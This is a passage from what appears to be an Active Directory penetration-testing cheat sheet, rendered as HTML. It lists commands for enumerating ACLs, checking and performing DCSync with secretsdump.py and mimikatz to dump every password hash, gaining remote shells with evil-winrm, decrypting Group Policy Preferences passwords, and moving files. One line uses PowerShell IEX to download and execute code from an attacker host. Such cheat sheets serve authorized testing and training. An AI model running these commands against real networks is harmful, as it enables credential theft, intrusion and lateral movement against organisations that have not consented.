class=\"p\">$((</span><span class=\"nb\">Get-ADRootDSE</span><span class=\"p\">).</span><span class=\"n\">ConfigurationNamingContext</span><span class=\"p\">)</span><span class=\"s2\">&quot;</span> <span class=\"n\">-Filter</span> <span class=\"p\">{</span><span class=\"n\">ObjectClass</span> <span class=\"o\">-like</span> <span class=\"s1\">&#39;ControlAccessRight&#39;</span><span class=\"p\">}</span> <span class=\"n\">-Properties</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">Name</span><span class=\"p\">,</span><span class=\"n\">DisplayName</span><span class=\"p\">,</span><span class=\"n\">DistinguishedName</span><span class=\"p\">,</span><span class=\"n\">rightsGuid</span> <span class=\"p\">|</span> <span class=\"p\">?{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">rightsGuid</span> <span class=\"o\">-eq</span> <span class=\"nv\">$guid</span><span class=\"p\">}</span> <span class=\"p\">|</span> <span class=\"nb\">fl</span>\n</code></pre></div>\n<h3 id=\"enumerate-acls-for-all-users-foreach-loop\">Enumerate ACLs for All Users (foreach loop)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-ADUser</span> <span class=\"n\">-Filter</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"nb\">Select-Object</span> <span class=\"n\">-ExpandProperty</span> <span class=\"n\">SamAccountName</span> <span class=\"p\">&gt;</span> <span class=\"n\">ad_users</span><span class=\"p\">.</span><span class=\"n\">txt</span>\n<span class=\"k\">foreach</span><span class=\"p\">(</span><span class=\"nv\">$line</span> <span class=\"k\">in</span> <span class=\"no\">[System.IO.File]</span><span class=\"p\">::</span><span class=\"n\">ReadLines</span><span class=\"p\">(</span><span class=\"s2\">&quot;C:\\Users\\&lt;username&gt;\\Desktop\\ad_users.txt&quot;</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nb\">get-acl</span> <span class=\"s2\">&quot;AD:\\</span><span class=\"p\">$(</span><span class=\"nb\">Get-ADUser</span> <span class=\"nv\">$line</span><span class=\"p\">)</span><span class=\"s2\">&quot;</span> <span class=\"p\">|</span> <span class=\"nb\">Select-Object</span> <span class=\"n\">Path</span> <span class=\"n\">-ExpandProperty</span> <span class=\"n\">Access</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">IdentityReference</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;&lt;DOMAIN&gt;\\\\&lt;username&gt;&#39;</span><span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"convert-sddl-string-to-readable-format\">Convert SDDL String to Readable Format</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">ConvertFrom-SddlString</span>\n</code></pre></div>\n<hr />\n<h2 id=\"dcsync\">DCSync</h2>\n<p>Replicate directory data as a domain controller to extract all password hashes.</p>\n<h3 id=\"check-dcsync-rights\">Check DCSync Rights</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">objectsid</span><span class=\"p\">,</span><span class=\"n\">memberof</span><span class=\"p\">,</span><span class=\"n\">useraccountcontrol</span> <span class=\"p\">|</span> <span class=\"nb\">fl</span>\n<span class=\"nv\">$sid</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;S-1-5-21-...&quot;</span>\n<span class=\"nb\">Get-ObjectAcl</span> <span class=\"s2\">&quot;DC=&lt;domain&gt;,DC=local&quot;</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span> <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">ObjectAceType</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;Replication-Get&#39;</span><span class=\"p\">)}</span> <span class=\"p\">|</span> <span class=\"p\">?{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-match</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">AceQualifier</span><span class=\"p\">,</span> <span class=\"n\">ObjectDN</span><span class=\"p\">,</span> <span class=\"n\">ActiveDirectoryRights</span><span class=\"p\">,</span><span class=\"n\">SecurityIdentifier</span><span class=\"p\">,</span><span class=\"n\">ObjectAceType</span> <span class=\"p\">|</span> <span class=\"nb\">fl</span>\n</code></pre></div>\n<h3 id=\"secretsdumppy-linux\">secretsdump.py (Linux)</h3>\n<div class=\"highlight\"><pre><span></span><code>secretsdump.py<span class=\"w\"> </span>-outputfile<span class=\"w\"> </span>hashes<span class=\"w\"> </span>-just-dc<span class=\"w\"> </span>&lt;DOMAIN&gt;/&lt;username&gt;@&lt;dc-ip&gt;<span class=\"w\"> </span>-use-vss\n</code></pre></div>\n<h3 id=\"mimikatz-dcsync-windows\">Mimikatz DCSync (Windows)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">mimikatz</span> <span class=\"c\"># lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:&lt;DOMAIN&gt;\\administrator</span>\n</code></pre></div>\n<hr />\n<h2 id=\"privileged-access\">Privileged Access</h2>\n<h3 id=\"enumerate-remote-desktop-winrm-groups\">Enumerate Remote Desktop / WinRM Groups</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-NetLocalGroupMember</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">workstation</span><span class=\"p\">&gt;</span> <span class=\"n\">-GroupName</span> <span class=\"s2\">&quot;Remote Desktop Users&quot;</span>\n<span class=\"nb\">Get-NetLocalGroupMember</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">workstation</span><span class=\"p\">&gt;</span> <span class=\"n\">-GroupName</span> <span class=\"s2\">&quot;Remote Management Users&quot;</span>\n</code></pre></div>\n<h3 id=\"create-pscredential-and-enter-pssession\">Create PSCredential and Enter-PSSession</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$password</span> <span class=\"p\">=</span> <span class=\"nb\">ConvertTo-SecureString</span> <span class=\"s2\">&quot;&lt;password&gt;&quot;</span> <span class=\"n\">-AsPlainText</span> <span class=\"n\">-Force</span>\n<span class=\"nv\">$cred</span> <span class=\"p\">=</span> <span class=\"nb\">new-object</span> <span class=\"n\">System</span><span class=\"p\">.</span><span class=\"n\">Management</span><span class=\"p\">.</span><span class=\"n\">Automation</span><span class=\"p\">.</span><span class=\"n\">PSCredential</span> <span class=\"p\">(</span><span class=\"s2\">&quot;&lt;DOMAIN&gt;\\&lt;username&gt;&quot;</span><span class=\"p\">,</span> <span class=\"nv\">$password</span><span class=\"p\">)</span>\n<span class=\"nb\">Enter-PSSession</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$cred</span>\n</code></pre></div>\n<h3 id=\"evil-winrm-linux\">evil-winrm (Linux)</h3>\n<div class=\"highlight\"><pre><span></span><code>evil-winrm<span class=\"w\"> </span>-i<span class=\"w\"> </span>&lt;target-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;\n</code></pre></div>\n<hr />\n<h2 id=\"miscellaneous-misconfigurations\">Miscellaneous Misconfigurations</h2>\n<h3 id=\"check-printer-bug-ms-prn\">Check Printer Bug (MS-PRN)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">SecurityAssessment</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nb\">Get-SpoolStatus</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"adidnsdump-resolve-dns-records-over-ldap\">adidnsdump - Resolve DNS Records Over LDAP</h3>\n<div class=\"highlight\"><pre><span></span><code>adidnsdump<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;domain&gt;<span class=\"se\">\\\\</span>&lt;username&gt;<span class=\"w\"> </span>ldap://&lt;dc-ip&gt;\nadidnsdump<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;domain&gt;<span class=\"se\">\\\\</span>&lt;username&gt;<span class=\"w\"> </span>ldap://&lt;dc-ip&gt;<span class=\"w\"> </span>-r\n</code></pre></div>\n<h3 id=\"find-users-with-passwords-not-required\">Find Users with Passwords Not Required</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-UACFilter</span> <span class=\"n\">PASSWD_NOTREQD</span> <span class=\"p\">|</span> <span class=\"nb\">Select-Object</span> <span class=\"n\">samaccountname</span><span class=\"p\">,</span><span class=\"n\">useraccountcontrol</span>\n</code></pre></div>\n<h3 id=\"list-sysvol-scripts\">List SYSVOL Scripts</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">ls </span><span class=\"p\">\\\\&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;\\</span><span class=\"n\">SYSVOL</span><span class=\"p\">\\&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;\\</span><span class=\"n\">scripts</span>\n</code></pre></div>\n<hr />\n<h2 id=\"group-policy-enumeration-attacks\">Group Policy Enumeration &amp; Attacks</h2>\n<h3 id=\"decrypt-gpp-password\">Decrypt GPP Password</h3>\n<div class=\"highlight\"><pre><span></span><code>gpp-decrypt<span class=\"w\"> </span>&lt;hash&gt;\n</code></pre></div>\n<h3 id=\"cme-gpp-enumeration\">CME GPP Enumeration</h3>\n<div class=\"highlight\"><pre><span></span><code>crackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>-L<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>gpp\ncrackmapexec<span class=\"w\"> </span>smb<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>gpp_autologin\n</code></pre></div>\n<h3 id=\"list-gpo-names\">List GPO Names</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGPO</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">displayname</span>\n<span class=\"nb\">Get-GPO</span> <span class=\"n\">-All</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">DisplayName</span>\n</code></pre></div>\n<h3 id=\"check-domain-users-gpo-rights\">Check Domain Users GPO Rights</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$sid</span> <span class=\"p\">=</span> <span class=\"nb\">Convert-NameToSid</span> <span class=\"s2\">&quot;Domain Users&quot;</span>\n<span class=\"nb\">Get-DomainGPO</span> <span class=\"p\">|</span> <span class=\"nb\">Get-ObjectAcl</span> <span class=\"p\">|</span> <span class=\"p\">?{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n<span class=\"nb\">Get-GPO</span> <span class=\"n\">-Guid</span> <span class=\"n\">7CA9C789</span><span class=\"p\">-</span><span class=\"n\">14CE</span><span class=\"p\">-</span><span class=\"n\">46E3-A722</span><span class=\"p\">-</span><span class=\"n\">83F4097AF532</span>\n</code></pre></div>\n<hr />\n<h2 id=\"file-transfer-techniques\">File Transfer Techniques</h2>\n<h3 id=\"python-http-server\">Python HTTP Server</h3>\n<div class=\"highlight\"><pre><span></span><code>sudo<span class=\"w\"> </span>python3<span class=\"w\"> </span>-m<span class=\"w\"> </span>http.server<span class=\"w\"> </span><span class=\"m\">8001</span>\n</code></pre></div>\n<h3 id=\"powershell-download\">PowerShell Download</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">IEX</span><span class=\"p\">(</span><span class=\"nb\">New-Object</span> <span class=\"n\">Net</span><span class=\"p\">.</span><span class=\"n\">WebClient</span><span class=\"p\">).</span><span class=\"n\">downloadString</span><span class=\"p\">(</span><span class=\"s1\">&#39;http://&lt;attacker-ip&gt;/SharpHound.exe&#39;</span><span class=\"p\">)</span>\n</code></pre></div>\n<h3 id=\"impacket-smb-server\">Impacket SMB Server</h3>\n<div class=\"highlight\"><pre><span></span><code>impacket-smbserver<span class=\"w\"> </span>-ip<span class=\"w\"> </span>&lt;attacker-ip&gt;<span class=\"w\"> </span>-smb2support<span class=\"w\"> </span>-username<span class=\"w\"> </span>user<span class=\"w\"> </span>-password<span class=\"w\"> </span>password<span class=\"w\"> </span>shared<span class=\"w\"> </span>/home/administrator/Downloads/\n</code></pre></div>", "excerpt": "Initial Enumeration Passive and active techniques to discover hosts, services, and domain information before authentication. DNS Lookup Query DNS to discover IP-to-hostname mappings. nslookup ns1.&lt;", "tags": []}